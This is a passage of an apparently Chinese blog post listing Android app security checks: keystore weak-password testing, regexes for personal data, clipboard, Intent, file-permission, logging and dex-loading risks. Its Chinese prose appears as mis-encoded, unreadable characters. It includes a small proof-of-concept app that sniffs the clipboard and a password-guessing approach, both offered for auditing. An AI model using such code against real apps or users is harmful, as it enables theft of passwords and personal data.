é£é™©</p><p>ï¼ˆæ–¹æ³•äºŒï¼‰åŸºäºpyjksçš„ç¬¬ä¸‰æ–¹pythonè§£æåº“</p><p>å®‰è£…<code>pip install pyjks</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_keystore_pwd</span>(<span class="params">self, jks_file, pwd</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        jks.KeyStore.load(jks_file, pwd)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡å¸¸è§çš„å¼±å¯†ç ç»„åˆè¿›è¡Œpayloadæµ‹è¯•ã€‚</p><p><strong>å»ºè®®</strong>ï¼š</p><p>æé«˜keystoreä¿æŠ¤å¯†ç çš„å¼ºåº¦ã€‚</p><h2 id="æ•°æ®å®‰å…¨æ£€æµ‹">æ•°æ®å®‰å…¨æ£€æµ‹</h2><h3 id="æ•æ„Ÿä¿¡æ¯æ£€æµ‹">æ•æ„Ÿä¿¡æ¯æ£€æµ‹</h3><p>é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ•æ„Ÿä¿¡æ¯</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„å‡ ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŒ¹é…é‚®ç®±åœ°å€ï¼Œæ‰‹æœºå·ï¼Œç”µè¯å·ç ï¼Œèº«ä»½è¯å’Œqqç­‰æ•æ„Ÿçš„ä¿¡æ¯ï¼Œçœ‹æ˜¯å¦æœ‰åœ¨ä»£ç ä¸­å‡ºç°ï¼Œæé†’å¼€å‘è€…æ³¨æ„è¿™äº›æ•æ„Ÿä¿¡æ¯ï¼Œé˜²æ­¢ä¸å¿…è¦çš„å¤–æ³„</p><p>é‚®ç®±åœ°å€</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp5</span> <span class="operator">=</span> <span class="string">&quot;[<span class="char escape_">\w</span>.-]+@[<span class="char escape_">\w</span>-]+<span class="char escape_">\.</span>[<span class="char escape_">\w</span>.]+&quot;</span></span><br></pre></td></tr></table></figure><p>æ‰‹æœºå·</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp6 = &quot;^(<span class="number">13</span>[<span class="number">0</span>-<span class="number">9</span>]|<span class="number">14</span>[<span class="number">5</span>|<span class="number">7</span>]|<span class="number">15[0|1|2</span>|<span class="number">3|5|6|7</span>|<span class="number">8</span>|<span class="number">9</span>]|<span class="number">18[0|1|2</span>|<span class="number">3|5|6|7</span>|<span class="number">8</span>|<span class="number">9</span>])\d&#123;<span class="number">8</span>&#125;$&quot;</span><br></pre></td></tr></table></figure><p>ç”µè¯å·ç </p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp7</span> <span class="operator">=</span> <span class="string">&quot;<span class="char escape_">\d</span>&#123;3&#125;-<span class="char escape_">\d</span>&#123;8&#125;|<span class="char escape_">\d</span>&#123;4&#125;-<span class="char escape_">\d</span>&#123;7&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>èº«ä»½è¯å·</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp8</span> <span class="operator">=</span> <span class="string">&quot;^<span class="char escape_">\d</span>&#123;15&#125;|<span class="char escape_">\d</span>&#123;18&#125;$&quot;</span></span><br></pre></td></tr></table></figure><p>QQå·</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">regexp9</span> <span class="operator">=</span> <span class="string">&quot;[1-9][0-9]&#123;4,&#125;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="å‰ªè´´æ¿æ•æ„Ÿä¿¡æ¯æ³„éœ²é£é™©æ£€æµ‹">å‰ªè´´æ¿æ•æ„Ÿä¿¡æ¯æ³„éœ²é£é™©æ£€æµ‹</h3><p>ç”±äºAndroidå‰ªè´´æ¿çš„å†…å®¹å‘ä»»ä½•æƒé™çš„appå¼€æ”¾ï¼Œå¾ˆå®¹æ˜“è¢«å—…æ¢æ³„å¯†ï¼ŒåŒä¸€éƒ¨æ‰‹æœºä¸­å®‰è£…çš„å…¶ä»–appï¼Œç”šè‡³æ˜¯ä¸€äº›æƒé™ä¸é«˜çš„appï¼Œéƒ½å¯ä»¥é€šè¿‡å‰ªè´´æ¿åŠŸèƒ½è·å–å‰ªè´´æ¿ä¸­çš„æ•æ„Ÿä¿¡æ¯</p><p>**é£é™©ç­‰çº§ï¼š**æé†’</p><p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">clipBtn = (Button) findViewById(R.id.btn_clip);</span><br><span class="line">clipBtn.setOnClickListener(<span class="keyword">new</span> <span class="title class_">OnClickListener</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">ClipboardManager</span> <span class="variable">clipboard</span> <span class="operator">=</span> (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClipData</span> <span class="variable">clip1</span> <span class="operator">=</span> ClipData.newPlainText(<span class="string">&quot;label&quot;</span>,<span class="string">&quot;password=123456&quot;</span>);</span><br><span class="line"></span><br><span class="line">        clipboard.setPrimaryClip(clip1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æ¼æ´å¯ä»¥åˆ©ç”¨å¦‚ä¸‹ä»£ç åˆ©ç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line"><span class="type">ClipboardManager</span> <span class="variable">clipBoard</span> <span class="operator">=</span> (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);</span><br><span class="line">clipBoard.addPrimaryClipChangedListener( <span class="keyword">new</span> <span class="title class_">ClipboardListener</span>() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">ClipboardManager</span> <span class="variable">cm</span> <span class="operator">=</span> (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);</span><br><span class="line"><span class="type">ClipData</span> <span class="variable">cd2</span> <span class="operator">=</span> cm.getPrimaryClip();</span><br><span class="line"><span class="type">String</span> <span class="variable">clipText</span> <span class="operator">=</span> cd2.getItemAt(<span class="number">0</span>).getText().toString();</span><br><span class="line"><span class="comment">//Log.v(&quot;clipboard&quot;, &quot;Attacked: &quot; + clipText);</span></span><br><span class="line">Toast.makeText(getApplicationContext(), <span class="string">&quot;Attacked: &quot;</span> + clipText, Toast.LENGTH_LONG).show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClipboardListener</span> <span class="keyword">implements</span> <span class="title class_">ClipboardManager</span>.OnPrimaryClipChangedListener &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onPrimaryClipChanged</span><span class="params">()</span> &#123;</span><br><span class="line">   attack();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å»ºè®®ï¼š</strong></p><p>é¿å…ä½¿ç”¨å‰ªè´´æ¿æ˜æ–‡å­˜å‚¨æ•æ„Ÿä¿¡æ¯æˆ–è¿›è¡ŒåŠ å¯†ã€‚</p><h3 id="Intentæ•æ„Ÿæ•°æ®æ³„éœ²é£é™©æ£€æµ‹">Intentæ•æ„Ÿæ•°æ®æ³„éœ²é£é™©æ£€æµ‹</h3><p>APPåˆ›å»ºIntentä¼ é€’æ•°æ®åˆ°å…¶ä»–Activityï¼Œå¦‚æœåˆ›å»ºçš„Activityä¸æ˜¯åœ¨åŒä¸€ä¸ªTaskä¸­æ‰“å¼€ï¼Œå°±å¾ˆå¯èƒ½è¢«å…¶ä»–çš„ActivityåŠ«æŒè¯»å–åˆ°Intentå†…å®¹ï¼Œè·¨Taskçš„Activityé€šè¿‡Intentä¼ é€’æ•æ„Ÿä¿¡æ¯æ˜¯ä¸å®‰å…¨çš„ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p><p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p><p>æ£€æµ‹æ˜¯å¦ä½¿ç”¨äº†FLAG_ACTIVITY_NEW_TASKæ ‡å¿—ã€‚</p><p><strong>å»ºè®®ï¼š</strong></p><p>å°½é‡é¿å…ä½¿ç”¨åŒ…å«FLAG_ACTIVITY_NEW_TASKæ ‡å¿—çš„Intentæ¥ä¼ é€’æ•æ„Ÿä¿¡æ¯ã€‚</p><h3 id="PendingIntentè¯¯ç”¨é£é™©">PendingIntentè¯¯ç”¨é£é™©</h3><p>ä½¿ç”¨pendingIntentæ—¶å€™ï¼Œå¦‚æœä½¿ç”¨äº†ä¸€ä¸ªç©ºIntentï¼Œä¼šå¯¼è‡´æ¶æ„ç”¨æˆ·åŠ«æŒIntentçš„å†…å®¹ã€‚ç¦æ­¢ä½¿ç”¨ç©ºintentå»æ„é€ pendingIntentã€‚</p><p>é£é™©ç­‰çº§ï¼š<code>ä¸­å±</code></p><p>é—®é¢˜ç¤ºä¾‹ï¼š</p><p>é€šè¿‡åˆ¤æ–­ä»£ç ç‰‡æ®µä¸­æœ‰æ²¡æœ‰å‡ºç°ä»¥ä¸‹å‡½æ•°ï¼Œå³å¯çŸ¥é“æ˜¯å¦ä½¿ç”¨äº†ç©ºintentæ„é€ PendingIntentã€‚</p><p><img src="/posts/f416437f.htm/image-20240920195326209.png" alt="image-20240920195326209"></p><p><strong>å»ºè®®ï¼š</strong></p><p>ç¦æ­¢ä½¿ç”¨ç©ºintentå»æ„é€ pendingIntentã€‚</p><h3 id="å¯†é’¥ç¡¬ç¼–ç é£é™©æ£€æµ‹">å¯†é’¥ç¡¬ç¼–ç é£é™©æ£€æµ‹</h3><p>å°†å¯†é’¥ç¡¬ç¼–ç åœ¨Javaä»£ç ã€æ–‡ä»¶ä¸­ï¼Œè¿™æ ·åšä¼šå¼•èµ·å¾ˆå¤§é£é™©ã€‚<strong>ä¿¡æ¯å®‰å…¨çš„åŸºç¡€åœ¨äºå¯†ç å­¦ï¼Œè€Œå¸¸ç”¨çš„å¯†ç å­¦ç®—æ³•éƒ½æ˜¯å…¬å¼€çš„ï¼ŒåŠ å¯†å†…å®¹çš„ä¿å¯†ä¾é çš„æ˜¯å¯†é’¥çš„ä¿å¯†</strong>ï¼Œå¯†é’¥å¦‚æœæ³„éœ²ï¼Œå¯¹äºå¯¹ç§°å¯†ç ç®—æ³•ï¼Œæ ¹æ®ç”¨åˆ°çš„å¯†é’¥ç®—æ³•å’ŒåŠ å¯†åçš„å¯†æ–‡ï¼Œå¾ˆå®¹æ˜“å¾—åˆ°åŠ å¯†å‰çš„æ˜æ–‡ï¼›å¯¹äºéå¯¹ç§°å¯†ç ç®—æ³•æˆ–è€…ç­¾åç®—æ³•ï¼Œæ ¹æ®å¯†é’¥å’Œè¦åŠ å¯†çš„æ˜æ–‡ï¼Œå¾ˆå®¹æ˜“è·å¾—è®¡ç®—å‡ºç­¾åå€¼ï¼Œä»è€Œä¼ªé€ ç­¾åã€‚</p><p>é£é™©ç­‰çº§ï¼š<code>æé†’</code></p><p>æ£€æµ‹ä½¿ç”¨ä»¥ä¸‹åŠ å¯†ç®—æ³•çš„è·¯å¾„ï¼Œç›®å‰è¯¥æ£€æµ‹é¡¹åªæ£€æµ‹æ˜¯å¦åœ¨Javaå±‚æœ‰<strong>æ˜¾å¼åœ°</strong>ä¿å­˜å¯†é’¥ï¼Œè¿™åº”è¯¥æ˜¯æœ€æœ‰é£é™©çš„ä¸€ç§ä¿å­˜æ–¹å¼ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AES<span class="regexp">/CBC/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/CBC/</span>PKCS7Padding</span><br><span class="line">AES<span class="regexp">/CTR/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/ECB/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/ECB/</span>PKCS7Padding</span><br><span class="line">AES<span class="regexp">/GCM/</span>NoPadding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>NoPadding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>PKCS1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">1</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">224</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">256</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">384</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">512</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPPadding</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®æˆ–ç¨‹åºåŠ è½½æ£€æŸ¥">æ•°æ®æˆ–ç¨‹åºåŠ è½½æ£€æŸ¥</h3><p>**é£é™©ç­‰çº§ï¼š**æé†’</p><p>éœ€è¦è¿›è¡ŒåŠ¨æ€åˆ†æ</p><ul><li>æ˜¯å¦åŠ è½½å…¬å…±åŒºåŸŸç¨‹åºï¼Œå¦‚sdcardã€/data/local/tmp/ã€åº”ç”¨è‡ªåˆ›å»ºä½†å…¶ä»–åº”ç”¨æœ‰è¯»å†™æƒé™çš„ç›®å½•ä¸Š</li><li>æ˜¯å¦ä»ç½‘ç»œä¸‹è½½ï¼Œæ£€æµ‹æ–¹æ³•åŒ…æ‹¬ï¼šé˜…è¯»ä»£ç ã€ç›‘å¬ç½‘è·¯è¯·æ±‚ã€è§è¯†å­˜å‚¨åŒºåŸŸæ–‡ä»¶è¯»å†™ã€æŸ¥çœ‹å®‰è£…åŒ…</li><li>å‡çº§åŒ…æ˜¯å¦å­˜åœ¨å…¬å…±åŒºåŸŸå­˜å‚¨</li></ul><h3 id="BASE64å®‰å…¨æ£€æµ‹">BASE64å®‰å…¨æ£€æµ‹</h3><p>é£é™©ç­‰çº§ï¼š<code>æé†’</code></p><p>æ£€æµ‹å‡ºBASE64å­—ç¬¦ä¸²ï¼Œå¹¶è§£å¯†ã€‚</p><h3 id="æ–‡ä»¶å…¨å±€è¯»å†™æ¼æ´æ£€æµ‹">æ–‡ä»¶å…¨å±€è¯»å†™æ¼æ´æ£€æµ‹</h3><p>åœ¨ä½¿ç”¨getDirï¼ŒgetSharedPreferencesæˆ–openFileOutputæ—¶ï¼Œå¦‚æœè®¾ç½®äº†å…¨å±€çš„å¯è¯»æƒé™ï¼Œæ”»å‡»è€…æ¶æ„è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚åœ¨è®¾ç½®æ–‡ä»¶å±æ€§æ—¶å¦‚æœè®¾ç½®å…¨å±€å¯å†™ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šç¯¡æ”¹ã€ä¼ªé€ å†…å®¹ï¼Œå¯èƒ½ä¼šè¿›è¡Œè¯ˆéª—ç­‰è¡Œä¸ºï¼Œé€ æˆç”¨æˆ·è´¢äº§æŸå¤±ã€‚å…¶ä¸­getSharedPreferenceså¦‚æœè®¾ç½®å…¨å±€å†™æƒé™ï¼Œåˆ™å½“æ”»å‡»appè·Ÿè¢«æ”»å‡»appå…·æœ‰ç›¸åŒçš„<code>Android:sharedUserId</code>å±æ€§æ—¶å’Œç­¾åæ—¶ï¼Œæ”»å‡»appåˆ™å¯ä»¥è®¿é—®åˆ°å†…éƒ¨å­˜å‚¨æ–‡ä»¶è¿›è¡Œå†™å…¥æ“ä½œã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>ä¸­å±</code></p><p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p><p>æ£€æµ‹å‡ºä½¿ç”¨äº†getDirã€getSharedPreferenceså’ŒopenFileOutputå‡½æ•°çš„å‚æ•°å€¼æ˜¯å¦ä½¿ç”¨äº†<code>MODE_WORLD_READABLEå’ŒMODE_WORLD_WRITEABLE</code>ã€‚</p><p><strong>å»ºè®®</strong>ï¼š</p><ul><li>ä½¿ç”¨MODE_PRIVATEæ¨¡å¼åˆ›å»ºå†…éƒ¨å­˜å‚¨æ–‡ä»¶</li><li>åŠ å¯†å­˜å‚¨æ•æ„Ÿæ•°æ®</li><li>é¿å…åœ¨æ–‡ä»¶ä¸­å­˜å‚¨æ˜æ–‡æ•æ„Ÿä¿¡æ¯</li><li>é¿å…æ»¥ç”¨â€Android:sharedUserIdâ€å±æ€§</li></ul><p>å¦‚æœä¸¤ä¸ªapp<code>Android:sharedUserId</code>å±æ€§ç›¸åŒï¼Œåˆ‡ä½¿ç”¨çš„ç­¾åä¹Ÿç›¸åŒï¼Œåˆ™è¿™ä¸¤ä¸ªappå¯ä»¥äº’ç›¸è®¿é—®å†…éƒ¨å­˜å‚¨æ–‡ä»¶æ•°æ®ã€‚</p><h3 id="æ—¥å¿—æ³„éœ²é£é™©æ£€æµ‹">æ—¥å¿—æ³„éœ²é£é™©æ£€æµ‹</h3><p>åœ¨APPçš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œé€šå¸¸ä¼šä½¿ç”¨logå‡½æ•°è¾“å‡ºä¸€äº›å…³é”®æµç¨‹çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ä¸­é€šå¸¸ä¼šåŒ…å«æ•æ„Ÿå†…å®¹ï¼Œå¦‚æ‰§è¡Œæµç¨‹ã€æ˜æ–‡çš„ç”¨æˆ·åå¯†ç ç­‰ï¼Œè¿™ä¼šè®©æ”»å‡»è€…æ›´åŠ å®¹æ˜“çš„äº†è§£APPå†…éƒ¨ç»“æ„æ–¹ä¾¿ç ´è§£å’Œæ”»å‡»ï¼Œç”šè‡³ç›´æ¥è·å–åˆ°æœ‰ä»·å€¼çš„æ•æ„Ÿä¿¡æ¯ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p><p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p><p>æ£€æµ‹æ˜¯å¦è°ƒç”¨äº†Log.vã€Log.dã€Log.eã€Log.iã€Log.wã€Log.fã€Log.så‡½æ•°</p><p><strong>å»ºè®®</strong>ï¼š</p><p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç§»é™¤Logæ‰“å°ã€‚</p><h3 id="å¤–éƒ¨åŠ è½½dexæ£€æµ‹">å¤–éƒ¨åŠ è½½dexæ£€æµ‹</h3><p>åŠ¨æ€åŠ è½½çš„dexæ–‡ä»¶å­˜å‚¨åœ¨è¢«å…¶ä»–åº”ç”¨ä»»æ„è¯»å†™çš„ç›®å½•ä¸­(å¦‚sdcard)ï¼Œå¦‚æœæ²¡æœ‰å¯¹å¤–éƒ¨æ‰€åŠ è½½çš„dexæ–‡ä»¶åšå®Œæ•´æ€§æ£€éªŒï¼Œåº”ç”¨å°†ä¼šè¢«æ¶æ„ä»£ç æ³¨å…¥ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç </p><p>**é£é™©ç­‰çº§ï¼š**é«˜å±</p><p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p><p>å…³é”®ï¼špublic DexClassLoader (String dexPath, String optimizedDirectory, String libraryPath, ClassLoader parent)</p><p>é¦–å…ˆè·å–æ‰€æœ‰è°ƒç”¨äº†DexClassLoaderå‡½æ•°çš„è·¯å¾„ï¼Œç„¶åå¯¹æ¯ä¸ªè·¯å¾„ä¸‹çš„ä»£ç ç‰‡æ®µè¿›è¡Œæ£€æŸ¥ï¼Œåˆ¤æ–­æœ‰æ²¡æœ‰è°ƒç”¨<code>Environment.getExternalStorageDirectory().toString()</code>è¯¥æ–¹æ³•ã€‚ä¸¤ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³ï¼Œåˆ™åˆ¤å®šè¯¥è·¯å¾„ä¸‹çš„ä»£ç ç‰‡æ®µæœ‰é£é™©ã€‚</p><p><strong>å»ºè®®ï¼š</strong></p><ul><li>å°†æ‰€éœ€è¦åŠ¨æ€åŠ è½½çš„DEX/APKæ–‡ä»¶æ”¾ç½®åœ¨APKå†…éƒ¨æˆ–åº”ç”¨ç§æœ‰ç›®å½•ä¸­</li><li>ä½¿ç”¨åŠ å¯†ç½‘ç»œåè®®è¿›è¡Œä¸‹è½½åŠ è½½çš„DEX/APKæ–‡ä»¶å¹¶å°†å…¶æ”¾ç½®åœ¨åº”ç”¨ç§æœ‰ç›®å½•ä¸­</li><li>å¯¹ä¸å¯ä¿¡çš„åŠ è½½æ¥æºè¿›è¡Œå®Œæ•´æ€§æ ¡éªŒ</li></ul><h3 id="å¤–éƒ¨å­˜å‚¨è·¯å¾„æ£€æµ‹">å¤–éƒ¨å­˜å‚¨è·¯å¾„æ£€æµ‹</h3><p>æ–‡ä»¶å­˜æ”¾åœ¨external storageï¼Œä¾‹å¦‚sdå¡ï¼Œæ˜¯å…¨å±€å¯è¯»å¯å†™çš„ï¼Œç”±äºexternal storageå¯ä»¥è¢«ä»»æ„ç”¨æˆ·æ“ä½œï¼Œä¸”å¯ä»¥è¢«æ‰€æœ‰åº”ç”¨ä¿®æ”¹ä½¿ç”¨ï¼Œæ‰€æœ‰ï¼Œappçš„æ•æ„Ÿæ•°æ®å»ºè®®ä¸è¦å­˜æ”¾åœ¨external storage</p><p>**é£é™©ç­‰çº§ï¼š**ä½å±</p><p>åŠ¨æ€æ–¹æ³•ç›‘æµ‹<code>/data/data/&lt;packagename&gt;/</code>ç›®å½•ä¸‹æ‰€æœ‰ç”Ÿæˆçš„ç›®å½•æ˜¯å¦å¸¦æœ‰æ˜æ–‡ä¿¡æ¯æ³„éœ²</p><h3 id="æ˜æ–‡æ•°å­—è¯ä¹¦é£é™©">æ˜æ–‡æ•°å­—è¯ä¹¦é£é™©</h3><p>Apkä¸­ä½¿ç”¨çš„æ•°å­—è¯ä¹¦å¯è¢«ç”¨æ¥æ ¡éªŒæœåŠ¡å™¨çš„åˆæ³•èº«ä»½ï¼Œä»¥åŠåœ¨ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡çš„è¿‡ç¨‹ä¸­å¯¹ä¼ è¾“æ•°æ®è¿›è¡ŒåŠ å¯†ã€è§£å¯†è¿ç®—ï¼Œä¿è¯ä¼ è¾“æ•°æ®çš„ä¿å¯†æ€§ã€å®Œæ•´æ€§ã€‚æ˜æ–‡å­˜å‚¨çš„æ•°å­—è¯ä¹¦å¦‚æœè¢«ç¯¡æ”¹ï¼Œå®¢æˆ·ç«¯å¯èƒ½è¿æ¥åˆ°å‡å†’çš„æœåŠ¡ç«¯ä¸Šï¼Œå¯¼è‡´ç”¨æˆ·åã€å¯†ç ç­‰ä¿¡æ¯è¢«çªƒå–ï¼›å¦‚æœæ˜æ–‡è¯ä¹¦è¢«ç›—å–ï¼Œå¯èƒ½é€ æˆä¼ è¾“æ•°æ®è¢«æˆªè·è§£å¯†ï¼Œç”¨æˆ·ä¿¡æ¯æ³„éœ²ï¼Œæˆ–è€…ä¼ªé€ å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œç¯¡æ”¹æœåŠ¡å™¨ä¸­çš„ç”¨æˆ·æ•°æ®æˆ–é€ æˆæœåŠ¡å™¨å“åº”å¼‚å¸¸ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>ä¸­å±</code></p><p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&quot;assets/location_public_key.der&quot;</span>,</span><br><span class="line">    <span class="string">&quot;assets/verisign.cer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;res/raw/servicecert.cer&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="æ•æ„Ÿå‡½æ•°è°ƒç”¨æ£€æµ‹">æ•æ„Ÿå‡½æ•°è°ƒç”¨æ£€æµ‹</h2><h3 id="å®‰å…¨ç›¸å…³çš„å‡½æ•°æ£€æµ‹">å®‰å…¨ç›¸å…³çš„å‡½æ•°æ£€æµ‹</h3><p>ä¸€äº›å­˜æ”¾æ•æ„Ÿçš„å®‰å…¨é…ç½®ä¿¡æ¯çš„<strong>å‡½æ•°</strong>ï¼Œä¸€èˆ¬å‡½æ•°åéƒ½å¯èƒ½å¸¦æœ‰encryptã€decryptã€encodã€decodã€aesã€sha1ã€sha256ã€sha512ã€md5ã€decodeã€encodeç­‰å…³é”®å­—ã€‚</p><p>é€šè¿‡encryptã€decryptã€encodã€decodã€aesã€sha1ã€sha256ã€sha512ã€md5ã€decodeã€encodeç­‰å’Œå®‰å…¨ç›¸å…³çš„å…³é”®å­—è¿›è¡ŒåŒ¹é…æŸ¥æ‰¾ï¼Œç„¶åé€ä¸ªæ£€æµ‹ç±»çš„å®‰å…¨æ€§ã€‚</p><h3 id="å®‰å…¨ç›¸å…³çš„ç±»æ£€æµ‹">å®‰å…¨ç›¸å…³çš„ç±»æ£€æµ‹</h3><p>ä¸€äº›å­˜æ”¾æ•æ„Ÿçš„å®‰å…¨é…ç½®ä¿¡æ¯çš„<strong>æ–‡ä»¶</strong>ï¼Œä¸€èˆ¬æ–‡ä»¶éƒ½å¯èƒ½å¸¦æœ‰encryptã€decryptã€encodã€decodã€aesã€sha1ã€sha256ã€sha512ã€md5ã€decodeã€encodeç­‰å…³é”®å­—ã€‚</p><p>é€šè¿‡encryptã€decryptã€encodã€decodã€aesã€sha1ã€sha256ã€sha512ã€md5ã€decodeã€encodeç­‰å’Œå®‰å…¨ç›¸å…³çš„å…³é”®å­—è¿›è¡ŒåŒ¹é…æŸ¥æ‰¾ï¼Œç„¶åé€ä¸ªæ£€æµ‹ç±»çš„å®‰å…¨æ€§ã€‚</p><h3 id="è¿è¡Œå‘½ä»¤æ£€æµ‹">è¿è¡Œå‘½ä»¤æ£€æµ‹</h3><p>æ£€æµ‹ å‘½ä»¤æ‰§è¡Œç›¸å…³çš„ä»£ç </p><p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p><p>Javaä»£ç </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime rr <span class="operator">=</span> Runtime.getRuntime()<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">Process p <span class="operator">=</span> rr.exec(<span class="string">&quot;ls -al&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight smali"><table><tr><td 